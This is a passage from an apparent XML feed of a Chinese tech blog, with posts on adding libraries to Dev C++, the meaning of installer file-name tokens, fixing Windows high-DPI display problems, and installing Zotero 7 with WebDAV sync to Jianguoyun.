class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>这些命令涵盖了Geth在日常使用中的常见需求，包括节点管理、账户管理、挖矿、网络连接、交易等。你可以根据自己的需求组合使用。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dev c++安装外部库</title>
      <link href="/2024/10/10/devc-an-zhuang-wai-bu-ku/"/>
      <url>/2024/10/10/devc-an-zhuang-wai-bu-ku/</url>
      
        <content type="html"><![CDATA[<h1 id="dev-c-安装外部库"><a href="#dev-c-安装外部库" class="headerlink" title="dev c++安装外部库"></a>dev c++安装外部库</h1><p>先去下载一个外部库压缩包，例如<a href="https://github.com/libtom/libtommath/releases">Releases · libtom/libtommath (github.com)</a></p><p>得到一个压缩包不要解压，打开DEV C++ -&gt;工具-&gt;package manager-&gt;install(找到你刚才的安装包)-&gt;安装完毕</p><p><img src="https://images.dadream.eu.org/images/2024/10/0e5f63951c3d9755f2eea6eb081bdb95.png"></p><p><img src="https://images.dadream.eu.org/images/2024/10/2899d25fe20c9db160235fe901c1c0a6.png"></p><p>然后工具-&gt;编译选项-&gt;目录-&gt;c++包含文件，如下添加路径</p><p><img src="https://images.dadream.eu.org/images/2024/10/314916c6d40c34b86c64b15e2e154f13.png"></p><p><img src="https://images.dadream.eu.org/images/2024/10/e5f4530cae912a78f07d34d84c3fd954.png"></p><p>点击右下角文件目录图样选择路径，路径如图在dev c++安装目录下找刚才安装的库，然后添加，确定</p>]]></content>
      
      
      <categories>
          
          <category> tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件名含义</title>
      <link href="/2024/10/10/wen-jian-ming-han-yi/"/>
      <url>/2024/10/10/wen-jian-ming-han-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="文件名含义"><a href="#文件名含义" class="headerlink" title="文件名含义"></a>文件名含义</h1><h3 id="1-版本号"><a href="#1-版本号" class="headerlink" title="1. 版本号"></a>1. <strong>版本号</strong></h3><p>安装文件名通常包含软件的版本号，用来表示该版本相对于其他版本的更新程度。</p><ul><li><strong>示例</strong>：<code>software_1.0.0.exe</code></li><li><strong>含义</strong>：软件版本为1.0.0，版本号通常采用三段式：<code>主版本号.次版本号.修订号</code>。主版本号表示重大更新，次版本号表示功能增加，修订号表示小的修复。</li></ul><h3 id="2-操作系统（OS）标识"><a href="#2-操作系统（OS）标识" class="headerlink" title="2. 操作系统（OS）标识"></a>2. <strong>操作系统（OS）标识</strong></h3><p>文件名中通常会有一个标识符，用于指定该安装文件适用于哪个操作系统。</p><ul><li>常见标识符：<ul><li><code>win</code>：Windows 系统</li><li><code>mac</code> 或 <code>osx</code>：Mac OS 系统</li><li><code>linux</code>：Linux 系统</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_win64.exe</code></li><li><strong>含义</strong>：该软件适用于64位的Windows系统。</li></ul><h3 id="3-位数或架构"><a href="#3-位数或架构" class="headerlink" title="3. 位数或架构"></a>3. <strong>位数或架构</strong></h3><p>安装文件通常会注明是为32位（x86）还是64位（x64）系统架构设计的。</p><ul><li>常见标识符：<ul><li><code>x86</code> 或 <code>32</code>：适用于32位系统</li><li><code>x64</code> 或 <code>64</code>：适用于64位系统</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_x64.deb</code></li><li><strong>含义</strong>：软件适用于64位架构的系统。</li></ul><h3 id="4-安装文件类型"><a href="#4-安装文件类型" class="headerlink" title="4. 安装文件类型"></a>4. <strong>安装文件类型</strong></h3><p>文件扩展名（如<code>.exe</code>, <code>.msi</code>, <code>.deb</code>, <code>.rpm</code>）表示安装文件的类型和其安装方式。</p><ul><li>常见扩展名：<ul><li><code>.exe</code>：Windows 可执行文件</li><li><code>.msi</code>：Windows 安装包</li><li><code>.deb</code>：Debian 或 Ubuntu 的安装包</li><li><code>.rpm</code>：Red Hat 或 CentOS 的安装包</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_amd64.deb</code></li><li><strong>含义</strong>：该软件是为64位系统的Debian或Ubuntu环境提供的安装包。</li></ul><h3 id="5-压缩格式"><a href="#5-压缩格式" class="headerlink" title="5. 压缩格式"></a>5. <strong>压缩格式</strong></h3><p>有些安装文件是以压缩包的形式发布的，文件名中会包含压缩格式的标识。</p><ul><li>常见扩展名：<ul><li><code>.zip</code>：ZIP 压缩格式</li><li><code>.tar.gz</code>：Gzip压缩的Tar包（常用于Linux）</li><li><code>.7z</code>：7-Zip压缩格式</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_linux.tar.gz</code></li><li><strong>含义</strong>：该文件是为Linux系统提供的安装包，并以Gzip格式压缩。</li></ul><h3 id="6-预发布-稳定版标识"><a href="#6-预发布-稳定版标识" class="headerlink" title="6. 预发布/稳定版标识"></a>6. <strong>预发布/稳定版标识</strong></h3><p>文件名中有时会包含有关该版本是否为稳定版或预发布版本的信息。</p><ul><li>常见标识符：<ul><li><code>beta</code>：测试版</li><li><code>alpha</code>：早期开发版</li><li><code>rc</code>：发布候选版（Release Candidate）</li><li><code>stable</code>：稳定版</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_beta.exe</code></li><li><strong>含义</strong>：该文件是软件的测试版。</li></ul><h3 id="7-特殊用途标识"><a href="#7-特殊用途标识" class="headerlink" title="7. 特殊用途标识"></a>7. <strong>特殊用途标识</strong></h3><p>某些文件名中可能还包含表示特定用途的标识符，例如为开发者准备的工具包、文档文件等。</p><ul><li>常见标识符：<ul><li><code>sdk</code>：软件开发工具包</li><li><code>docs</code>：文档</li><li><code>lite</code>：精简版</li><li><code>full</code>：完整版本</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_sdk_win64.zip</code></li><li><strong>含义</strong>：该文件是用于Windows 64位系统的软件开发工具包，并以ZIP格式压缩。</li></ul><h3 id="8-语言或区域标识"><a href="#8-语言或区域标识" class="headerlink" title="8. 语言或区域标识"></a>8. <strong>语言或区域标识</strong></h3><p>某些安装文件可能还会包含语言或区域的代码，表示该软件适用于特定语言版本。</p><ul><li>常见标识符：<ul><li><code>en</code>：英语</li><li><code>cn</code> 或 <code>zh</code>：中文</li><li><code>fr</code>：法语</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_win64_zh-cn.exe</code></li><li><strong>含义</strong>：这是面向中国大陆的中文版本，适用于64位的Windows系统。</li></ul><h3 id="9-发行渠道或发行模式"><a href="#9-发行渠道或发行模式" class="headerlink" title="9. 发行渠道或发行模式"></a>9. <strong>发行渠道或发行模式</strong></h3><p>文件名中有时会标明软件的发行渠道或模式，帮助用户了解该软件是通过何种方式发布的。</p><ul><li>常见标识符：<ul><li><code>offline</code> 或 <code>standalone</code>：离线安装包，不需要网络连接即可安装</li><li><code>web</code> 或 <code>online</code>：在线安装器，下载时体积小，安装过程中需要联网下载额外文件</li><li><code>portable</code>：便携版，通常无需安装，可直接运行</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_win64_offline.exe</code></li><li><strong>含义</strong>：适用于64位Windows系统的离线安装包。</li></ul><h3 id="10-安全标识或加密"><a href="#10-安全标识或加密" class="headerlink" title="10. 安全标识或加密"></a>10. <strong>安全标识或加密</strong></h3><p>某些安装文件可能在名称中包含与安全相关的标识符，通常用于表示该文件的来源可信或包含特定的安全加密方式。</p><ul><li>常见标识符：<ul><li><code>signed</code>：已签名的安装文件，确保文件未被篡改</li><li><code>hash</code>：指文件的哈希值（如SHA256），用户可用来验证文件完整性</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_win64_signed.exe</code></li><li><strong>含义</strong>：该文件已经过数字签名验证，确保文件的来源安全。</li></ul><h3 id="11-支持的硬件平台"><a href="#11-支持的硬件平台" class="headerlink" title="11. 支持的硬件平台"></a>11. <strong>支持的硬件平台</strong></h3><p>一些安装文件会标明其支持的硬件平台，特别是在跨平台软件或硬件驱动程序中，这一点很常见。</p><ul><li>常见标识符：<ul><li><code>arm</code> 或 <code>arm64</code>：适用于基于ARM架构的设备</li><li><code>intel</code> 或 <code>x86_64</code>：适用于基于Intel或AMD x86_64架构的设备</li><li><code>nvidia</code>：适用于NVIDIA显卡驱动</li><li><code>amd</code>：适用于AMD显卡驱动</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_arm64.deb</code></li><li><strong>含义</strong>：该安装包适用于基于ARM64架构的设备，通常在移动设备或某些低功耗的服务器上使用。</li></ul><h3 id="12-地域和市场"><a href="#12-地域和市场" class="headerlink" title="12. 地域和市场"></a>12. <strong>地域和市场</strong></h3><p>某些安装文件名会指出该软件是为特定国家或地区的市场发布的，特别是在带有本地化内容或法规限制的软件中。</p><ul><li>常见标识符：<ul><li><code>us</code>：美国市场</li><li><code>eu</code>：欧洲市场</li><li><code>cn</code>：中国市场</li><li><code>jp</code>：日本市场</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_win64_cn.exe</code></li><li><strong>含义</strong>：该文件是适用于中国市场的Windows 64位版本。</li></ul><h3 id="13-多语言支持"><a href="#13-多语言支持" class="headerlink" title="13. 多语言支持"></a>13. <strong>多语言支持</strong></h3><p>文件名中有时会包含软件的语言支持类型，表示是否为多语言版本或仅支持特定语言。</p><ul><li>常见标识符：<ul><li><code>ml</code> 或 <code>multi</code>：多语言版本</li><li><code>en</code>：仅支持英语</li><li><code>zh-cn</code>：简体中文</li><li><code>es</code>：西班牙语</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_win64_multi.exe</code></li><li><strong>含义</strong>：该安装文件支持多种语言，用户可以在安装时选择语言。</li></ul><h3 id="14-开发版本类型"><a href="#14-开发版本类型" class="headerlink" title="14. 开发版本类型"></a>14. <strong>开发版本类型</strong></h3><p>开发者在发布未完成的测试版软件时，文件名中可能包含不同类型的开发版本标识符。这些标识符有助于区分不同的开发阶段。</p><ul><li>常见标识符：<ul><li><code>dev</code>：开发版，通常是未完成的版本，用于开发者内部测试</li><li><code>snapshot</code>：快照版，是开发过程中某个时间点的版本</li><li><code>nightly</code>：每晚构建版，指每天自动生成的开发版</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_snapshot_win64.exe</code></li><li><strong>含义</strong>：该文件是开发过程中的快照版本，可能不稳定或包含实验性功能。</li></ul><h3 id="15-安装模式"><a href="#15-安装模式" class="headerlink" title="15. 安装模式"></a>15. <strong>安装模式</strong></h3><p>文件名中有时会包含不同的安装模式，特别是在支持用户自定义安装或选择不同模块的安装包中。</p><ul><li>常见标识符：<ul><li><code>full</code>：完整安装包，包含所有功能模块</li><li><code>lite</code> 或 <code>min</code>：轻量或精简版，包含最少的功能模块</li><li><code>custom</code>：用户可以自定义选择安装哪些功能模块</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_win64_lite.exe</code></li><li><strong>含义</strong>：这是软件的精简版，适用于64位Windows系统，可能省去了一些不常用的功能。</li></ul><h3 id="16-分发类型"><a href="#16-分发类型" class="headerlink" title="16. 分发类型"></a>16. <strong>分发类型</strong></h3><p>某些安装文件会根据分发渠道或协议进行分类，特别是开源软件或商业软件中，这些标识符帮助用户了解软件的使用条款或发布方式。</p><ul><li>常见标识符：<ul><li><code>community</code>：社区版，通常是免费或开源版本</li><li><code>enterprise</code> 或 <code>pro</code>：企业版或专业版，通常包含高级功能，面向商业用户</li><li><code>trial</code>：试用版，提供一定期限的免费使用</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_enterprise_win64.exe</code></li><li><strong>含义</strong>：这是面向企业用户的专业版安装包。</li></ul><h3 id="17-补丁版本和维护版本"><a href="#17-补丁版本和维护版本" class="headerlink" title="17. 补丁版本和维护版本"></a>17. <strong>补丁版本和维护版本</strong></h3><p>有些文件名会包含补丁（patch）或维护（maintenance）版本信息，表示该文件是在原版基础上进行修复、改进或安全更新的版本。</p><ul><li>常见标识符：<ul><li><code>patch</code> 或 <code>hotfix</code>：补丁版，修复特定问题</li><li><code>sp1</code>, <code>sp2</code> 等：服务包版本（Service Pack），通常是对多个问题的修复合集</li><li><code>update</code>：更新版本，提供功能改进或错误修复</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_sp1_win64.exe</code></li><li><strong>含义</strong>：这是软件1.0.0版本的第一个服务包，适用于64位Windows系统，包含问题修复和改进。</li></ul><h3 id="18-兼容性标识"><a href="#18-兼容性标识" class="headerlink" title="18. 兼容性标识"></a>18. <strong>兼容性标识</strong></h3><p>某些安装文件会注明与其他软件或硬件的兼容性信息，特别是在驱动程序或插件的安装包中。</p><ul><li>常见标识符：<ul><li><code>compatible</code>：表示与特定系统或硬件兼容</li><li><code>legacy</code>：遗留版本，支持旧版本系统或硬件</li><li><code>universal</code>：通用版，适用于多个平台</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_win64_legacy.exe</code></li><li><strong>含义</strong>：这是适用于旧版本Windows系统或旧硬件的安装包。</li></ul><h3 id="19-试用期或限制"><a href="#19-试用期或限制" class="headerlink" title="19. 试用期或限制"></a>19. <strong>试用期或限制</strong></h3><p>某些商业软件的试用版会在文件名中包含试用期或功能限制的信息。</p><ul><li>常见标识符：<ul><li><code>trial30</code> 或 <code>trial60</code>：表示该版本有30天或60天的试用期</li><li><code>limited</code>：有限制版，可能功能或时间受限</li><li><code>demo</code>：演示版，通常只包含部分功能或限制使用时间</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_trial30_win64.exe</code></li><li><strong>含义</strong>：这是带有30天试用期的版本，适用于64位Windows系统。</li></ul><h3 id="20-多合一安装包"><a href="#20-多合一安装包" class="headerlink" title="20. 多合一安装包"></a>20. <strong>多合一安装包</strong></h3><p>有些软件提供“多合一”安装包，允许用户在一个安装文件中选择不同的安装选项或版本。</p><ul><li>常见标识符：<ul><li><code>all-in-one</code>：多合一安装包，包含多个版本或功能模块</li><li><code>combo</code>：组合安装包，通常包含主程序和附加组件</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_all-in-one_win64.exe</code></li><li><strong>含义</strong>：这是一个多合一安装包，适用于64位Windows系统，可能包含多个模块或功能供选择安装。</li></ul><h3 id="21-源代码和构建信息"><a href="#21-源代码和构建信息" class="headerlink" title="21. 源代码和构建信息"></a>21. <strong>源代码和构建信息</strong></h3><p>某些开源软件的安装文件名中可能包含源代码的相关信息，供开发者自行构建或定制。</p><ul><li>常见标识符：<ul><li><code>src</code> 或 <code>source</code>：源代码</li><li><code>build</code>：构建版本</li><li><code>bin</code>：二进制文件，已编译可直接运行</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_src.tar.gz</code></li><li><strong>含义</strong>：这是软件的源代码包，以Gzip压缩的Tar格式发布，适用于开发者。</li></ul><h3 id="22-安装程序或压缩包"><a href="#22-安装程序或压缩包" class="headerlink" title="22. 安装程序或压缩包"></a>22. <strong>安装程序或压缩包</strong></h3><p>文件名中还可能指明软件是通过安装程序直接安装，还是提供压缩包供手动解压和安装。</p><ul><li>常见标识符：<ul><li><code>installer</code>：安装程序，通常是带有图形化或命令行界面的安装文件</li><li><code>portable</code>：便携版，无需安装，解压后即可运行</li><li><code>archive</code>：压缩包，通常需要手动解压后安装或运行</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_portable_win64.zip</code></li><li><strong>含义</strong>：这是适用于64位Windows系统的便携版软件，用户无需安装，解压后即可使用。</li></ul><h3 id="23-企业或个人版"><a href="#23-企业或个人版" class="headerlink" title="23. 企业或个人版"></a>23. <strong>企业或个人版</strong></h3><p>某些软件文件名中可能明确区分企业版和个人版，以帮助用户选择合适的版本。</p><ul><li>常见标识符：<ul><li><code>enterprise</code> 或 <code>business</code>：企业版，面向商业用户，通常包含更多管理或安全功能</li><li><code>personal</code>：个人版，面向普通用户，功能较简化</li><li><code>home</code>：家庭版，适合家庭用户使用</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_enterprise_win64.exe</code></li><li><strong>含义</strong>：这是适用于企业用户的64位Windows系统版本。</li></ul><h3 id="24-特定用途的子版本"><a href="#24-特定用途的子版本" class="headerlink" title="24. 特定用途的子版本"></a>24. <strong>特定用途的子版本</strong></h3><p>软件可能根据不同用途或功能模块发布子版本，文件名中会包含对应的模块标识。</p><ul><li>常见标识符：<ul><li><code>server</code>：服务器版，适用于服务器环境</li><li><code>client</code>：客户端版，适用于普通用户</li><li><code>gui</code>：图形用户界面版本</li><li><code>cli</code>：命令行版本</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_server_win64.exe</code></li><li><strong>含义</strong>：这是软件的服务器版本，适用于64位Windows系统。</li></ul><h3 id="25-云服务或集成"><a href="#25-云服务或集成" class="headerlink" title="25. 云服务或集成"></a>25. <strong>云服务或集成</strong></h3><p>随着云计算的普及，某些安装包可能包含云端服务集成的信息，帮助用户了解该软件是否与云服务兼容或包含云功能。</p><ul><li>常见标识符：<ul><li><code>cloud</code>：与云服务集成，或为云环境设计的版本</li><li><code>saas</code>：软件即服务（Software as a Service）版本</li><li><code>hybrid</code>：混合云，支持本地和云服务的集成</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_cloud_win64.exe</code></li><li><strong>含义</strong>：这是支持云服务集成的版本，适用于64位Windows系统。</li></ul><h3 id="26-模块化安装"><a href="#26-模块化安装" class="headerlink" title="26. 模块化安装"></a>26. <strong>模块化安装</strong></h3><p>某些软件会根据不同的功能模块或插件来区分不同的安装包，文件名中通常会有相应模块的标识符。</p><ul><li>常见标识符：<ul><li><code>core</code>：核心模块，必需的主功能</li><li><code>plugin</code>：插件模块，扩展功能或第三方插件</li><li><code>addon</code>：附加功能模块，通常用于增强主功能</li><li><code>extension</code>：扩展功能，常用于浏览器或IDE</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_core_win64.exe</code></li><li><strong>含义</strong>：这是软件的核心模块，适用于64位Windows系统，可能不包括其他可选功能或插件。</li></ul><h3 id="27-操作系统版本兼容性"><a href="#27-操作系统版本兼容性" class="headerlink" title="27. 操作系统版本兼容性"></a>27. <strong>操作系统版本兼容性</strong></h3><p>文件名中可能会包含针对特定操作系统版本的标识，特别是当某些软件只能在某些系统版本上运行时。</p><ul><li>常见标识符：<ul><li><code>xp</code>, <code>vista</code>, <code>7</code>, <code>8</code>, <code>10</code>, <code>11</code>：表示适用于特定版本的Windows操作系统</li><li><code>ubuntu18.04</code>, <code>ubuntu20.04</code>：表示适用于特定版本的Ubuntu系统</li><li><code>macos10.15</code>, <code>macos11</code>：表示适用于特定版本的macOS系统</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_win10_win64.exe</code></li><li><strong>含义</strong>：这是适用于Windows 10系统的64位安装文件，可能不兼容其他Windows版本。</li></ul><h3 id="28-国际化和本地化"><a href="#28-国际化和本地化" class="headerlink" title="28. 国际化和本地化"></a>28. <strong>国际化和本地化</strong></h3><p>软件发布时，可能会根据不同国家和地区进行本地化调整，文件名中会包含国际化的标识符，以帮助用户选择适合自己语言和地区的版本。</p><ul><li>常见标识符：<ul><li><code>intl</code>：国际化版本，支持多种语言和地区</li><li><code>us</code>：美国地区版本</li><li><code>cn</code>, <code>zh-cn</code>：中国简体中文版本</li><li><code>de</code>：德国版</li><li><code>jp</code>：日本版</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_zh-cn_win64.exe</code></li><li><strong>含义</strong>：这是简体中文版本，适用于64位Windows系统。</li></ul><h3 id="29-编译器或运行时兼容"><a href="#29-编译器或运行时兼容" class="headerlink" title="29. 编译器或运行时兼容"></a>29. <strong>编译器或运行时兼容</strong></h3><p>对于开发工具或软件开发包（SDK），安装文件名可能会包含与特定编译器或运行时环境的兼容性信息。</p><ul><li>常见标识符：<ul><li><code>gcc</code>：GNU编译器（通常用于Linux）</li><li><code>msvc</code>：Microsoft Visual C++ 编译器（Windows）</li><li><code>jdk</code>：Java开发工具包（JDK）</li><li><code>dotnet</code>：.NET运行时环境</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_gcc_linux64.tar.gz</code></li><li><strong>含义</strong>：这是用GCC编译的版本，适用于64位Linux系统。</li></ul><h3 id="30-虚拟机或容器支持"><a href="#30-虚拟机或容器支持" class="headerlink" title="30. 虚拟机或容器支持"></a>30. <strong>虚拟机或容器支持</strong></h3><p>安装文件可能包含与虚拟化或容器化环境兼容的信息，特别是在需要虚拟机镜像或容器映像的情况下。</p><ul><li>常见标识符：<ul><li><code>vm</code>：虚拟机镜像（如VirtualBox、VMware）</li><li><code>docker</code>：Docker容器映像</li><li><code>vagrant</code>：Vagrant虚拟机镜像</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_docker_image.tar</code></li><li><strong>含义</strong>：这是Docker的容器镜像文件，通常用于容器化部署。</li></ul><h3 id="31-加密和安全机制"><a href="#31-加密和安全机制" class="headerlink" title="31. 加密和安全机制"></a>31. <strong>加密和安全机制</strong></h3><p>某些软件安装文件中会包含加密或安全机制的信息，特别是针对高度敏感的应用程序或企业环境。</p><ul><li>常见标识符：<ul><li><code>encrypted</code>：表示安装包已加密，需特定密钥或密码才能解压或安装</li><li><code>fips</code>：符合FIPS（Federal Information Processing Standards）标准，适用于政府或安全要求较高的环境</li><li><code>hsm</code>：硬件安全模块（Hardware Security Module）兼容</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_fips_win64.exe</code></li><li><strong>含义</strong>：这是符合FIPS标准的版本，适用于需要高安全性的64位Windows系统。</li></ul><h3 id="32-数据库或数据存储支持"><a href="#32-数据库或数据存储支持" class="headerlink" title="32. 数据库或数据存储支持"></a>32. <strong>数据库或数据存储支持</strong></h3><p>某些软件文件名会指出其支持的数据库或数据存储解决方案，特别是在涉及数据库管理工具或与特定数据库整合的应用中。</p><ul><li>常见标识符：<ul><li><code>mysql</code>：支持MySQL数据库</li><li><code>pgsql</code>：支持PostgreSQL数据库</li><li><code>mongodb</code>：支持MongoDB数据库</li><li><code>redis</code>：支持Redis数据库</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_mysql_win64.exe</code></li><li><strong>含义</strong>：这是支持MySQL数据库的版本，适用于64位Windows系统。</li></ul><h3 id="33-API或协议支持"><a href="#33-API或协议支持" class="headerlink" title="33. API或协议支持"></a>33. <strong>API或协议支持</strong></h3><p>安装文件名中有时会提到软件支持的API或协议，特别是当软件依赖特定的网络协议或服务接口时。</p><ul><li>常见标识符：<ul><li><code>rest</code>：支持REST API</li><li><code>grpc</code>：支持gRPC协议</li><li><code>soap</code>：支持SOAP协议</li><li><code>http2</code>：支持HTTP/2协议</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_rest_win64.exe</code></li><li><strong>含义</strong>：这是支持REST API的版本，适用于64位Windows系统。</li></ul><h3 id="34-虚拟现实（VR）或增强现实（AR）支持"><a href="#34-虚拟现实（VR）或增强现实（AR）支持" class="headerlink" title="34. 虚拟现实（VR）或增强现实（AR）支持"></a>34. <strong>虚拟现实（VR）或增强现实（AR）支持</strong></h3><p>随着虚拟现实和增强现实技术的应用，一些安装文件可能包含与VR或AR兼容的信息。</p><ul><li>常见标识符：<ul><li><code>vr</code>：虚拟现实支持</li><li><code>ar</code>：增强现实支持</li><li><code>xr</code>：扩展现实（Extended Reality），包括VR和AR</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_vr_win64.exe</code></li><li><strong>含义</strong>：这是支持虚拟现实的版本，适用于64位Windows系统。</li></ul><h3 id="35-物联网（IoT）支持"><a href="#35-物联网（IoT）支持" class="headerlink" title="35. 物联网（IoT）支持"></a>35. <strong>物联网（IoT）支持</strong></h3><p>随着物联网技术的普及，一些软件的安装文件名可能包含物联网相关的支持信息。</p><ul><li>常见标识符：<ul><li><code>iot</code>：物联网支持，适用于物联网设备</li><li><code>edge</code>：边缘计算设备支持</li><li><code>mqtt</code>：支持MQTT协议（常用于物联网）</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_iot_linux64.tar.gz</code></li><li><strong>含义</strong>：这是支持物联网功能的版本，适用于64位Linux系统。</li></ul><h3 id="36-大数据平台兼容"><a href="#36-大数据平台兼容" class="headerlink" title="36. 大数据平台兼容"></a>36. <strong>大数据平台兼容</strong></h3><p>对于与大数据平台集成的软件，文件名中可能会包含特定平台的支持信息。</p><ul><li>常见标识符：<ul><li><code>hadoop</code>：支持Hadoop平台</li><li><code>spark</code>：支持Apache Spark</li><li><code>hive</code>：支持Apache Hive</li><li><code>kafka</code>：支持Apache Kafka</li></ul></li><li><strong>示例</strong>：<code>software_1.0.0_hadoop_win64.exe</code></li><li><strong>含义</strong>：这是支持Hadoop平台的版本，适用于64位Windows系统。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows显示异常</title>
      <link href="/2024/10/03/windows-xian-shi-yi-chang/"/>
      <url>/2024/10/03/windows-xian-shi-yi-chang/</url>
      
        <content type="html"><![CDATA[<h1 id="windows显示异常"><a href="#windows显示异常" class="headerlink" title="windows显示异常"></a>windows显示异常</h1><p>windows中显示不完整，或者遮挡等不正常显示时，如下修改</p><p>进入软件的exe执行文件，右键-&gt;属性-&gt;兼容性-&gt;更改所有用户的设置-&gt;更改高DPI设置-&gt;高DPI缩放替代-&gt;勾选替代高DPI的缩放行为指定系统，从上到下依次尝试</p><p><img src="https://images.dadream.eu.org/images/2024/10/2c720759e87891d9b603f00411555832.png"></p>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zotero 7安装以及使用</title>
      <link href="/2024/09/28/zotero-7-an-zhuang-yi-ji-shi-yong/"/>
      <url>/2024/09/28/zotero-7-an-zhuang-yi-ji-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="zotero-7安装以及使用"><a href="#zotero-7安装以及使用" class="headerlink" title="zotero 7安装以及使用"></a>zotero 7安装以及使用</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li><strong>访问官网</strong>：<ul><li>打开浏览器，访问 <a href="https://www.zotero.org/">Zotero官网</a>。</li></ul></li><li><strong>下载 Zotero</strong>：<ul><li>点击页面上的“Download”按钮。</li><li>根据你的操作系统选择相应的版本（Windows、macOS、Linux）。</li></ul></li><li><strong>安装 Zotero</strong>：<ul><li>Windows：<ul><li>下载完成后，双击下载的 <code>.exe</code> 文件。</li><li>按照提示进行安装，完成后在开始菜单中找到Zotero。</li></ul></li><li>macOS：<ul><li>下载 <code>.dmg</code> 文件后，双击打开。</li><li>将Zotero图标拖动到“应用程序”文件夹中。</li></ul></li><li>Linux：<ul><li>根据你的发行版选择合适的安装方式（如使用包管理器或手动解压）。</li></ul></li></ul></li></ol><h2 id="设置同步"><a href="#设置同步" class="headerlink" title="设置同步"></a>设置同步</h2><p><strong>创建 Zotero 账户</strong>：</p><ul><li>如果还没有账户，访问 <a href="https://www.zotero.org/">Zotero官网</a> 并点击“注册”以创建一个新账户。填写所需信息并确认电子邮件。</li></ul><p><strong>进入首选项</strong>：</p><ul><li>点击菜单栏中的“编辑”（Windows）或“Zotero”（macOS）。</li><li>选择“设置”以打开设置窗口。</li></ul><p><strong>设置同步</strong>：</p><ul><li>在设置窗口中，选择“同步”选项卡。</li><li>在“账户”部分，输入你的 Zotero 账户邮箱和密码。</li><li>点击“验证”以确保信息正确。</li></ul><p><strong>启用同步</strong>：</p><ul><li>勾选“自动同步”选项。这将允许 Zotero 在你添加或修改文献时自动进行同步。</li></ul><p><strong>手动同步</strong>：</p><ul><li>在 Zotero 界面的右上角，有一个绿色的同步图标（两个旋转的箭头）。点击它可以手动触发同步。</li></ul><h2 id="设置同步到坚果云"><a href="#设置同步到坚果云" class="headerlink" title="设置同步到坚果云"></a>设置同步到坚果云</h2><ul><li>首先在坚果云里为Zotero设置应用密码，在坚果云官网登录你的坚果云账号后打开【账户信息】</li></ul><p><img src="https://help.jianguoyun.com/wp-content/uploads/2017/06/%E7%BD%91%E9%A1%B5%E7%AB%AF%E8%B4%A6%E6%88%B7%E4%BF%A1%E6%81%AF.png" alt="账户信息"></p><ul><li>选择【安全选项】-【添加应用密码】-输入名称-【生成密码】，这个密码就是后面会在zoteor里需要输入的专门的应用密码。</li></ul><p><img src="https://help.jianguoyun.com/wp-content/uploads/2017/06/%E5%AE%89%E5%85%A8%E9%80%89%E9%A1%B9-1.png" alt="安全选项"></p><p><img src="https://help.jianguoyun.com/wp-content/uploads/2017/06/%E7%94%9F%E6%88%90%E5%AF%86%E7%A0%81.png" alt="密码"></p><p><img src="https://help.jianguoyun.com/wp-content/uploads/2017/06/%E5%AE%8C%E6%88%90%E5%AF%86%E7%A0%81.png" alt="img"></p><ul><li>打开Zotero，选择【工具】-【首选项】</li></ul><p><a href="http://help.jianguoyun.com/wp-content/uploads/2017/06/QQ%E6%88%AA%E5%9B%BE20170601102448.jpg"><img src="http://help.jianguoyun.com/wp-content/uploads/2017/06/QQ%E6%88%AA%E5%9B%BE20170601102448.jpg" alt="QQ截图20170601102448"></a></p><ul><li>打开【同步】，<strong>Zotero同步服务器</strong>里登录的是你的Zotero账号和密码，在下面的<strong>文件同步</strong>里选择使用【WebDav】</li></ul><p><a href="http://help.jianguoyun.com/wp-content/uploads/2017/06/QQ%E6%88%AA%E5%9B%BE20170601102548.jpg"><img src="http://help.jianguoyun.com/wp-content/uploads/2017/06/QQ%E6%88%AA%E5%9B%BE20170601102548.jpg" alt="QQ截图20170601102548"></a></p><ul><li>在这里填写你的坚果云的服务器地址：<a 